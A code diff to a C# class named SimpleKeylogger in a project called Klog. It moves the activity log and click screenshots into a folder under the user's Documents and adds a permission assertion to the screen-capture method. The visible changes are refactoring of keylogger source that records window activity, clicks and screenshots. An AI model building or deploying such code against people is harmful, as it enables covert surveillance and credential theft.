@@ -9,12 +9,16 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using Klog.Properties;
 using System.IO;
+using System.Security.Permissions;
 
 namespace Klog
 {
     public class SimpleKeylogger 
     {
-        public const String LogFileName = @"Logs\Klog.txt";
+        public static readonly String LogPath = 
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), @"Klog-Logs");
+        public static readonly String LogFileName =
+            Path.Combine(LogPath, "Activity.txt");
 
         // Helpers
         ForegroundWindow _window = new ForegroundWindow();
@@ -83,8 +87,9 @@ namespace Klog
             if (e.Clicks == 0)
             {
                 String filename = GetNextBitmapFilename();
+
                 CaptureClickBitmap(e.Location, filename);
-                
+
                 LogEvent("[Click #"+ (_nextBitmapNum-1) +"]");
             }
         }
@@ -93,12 +98,13 @@ namespace Klog
         {
             while (true)
             {
-                String filename = @"Logs\Click" + _nextBitmapNum.ToString("00000") + ".png";
+                String filename = Path.Combine(LogPath, "Click" + _nextBitmapNum.ToString("00000") + ".png");
                 ++_nextBitmapNum;
                 if (!File.Exists(filename)) { return filename; }
             }
         }
 
+        [UIPermission(SecurityAction.Assert)]
         void CaptureClickBitmap(Point clickLocation, String filename)
         {
             int Off = 4;
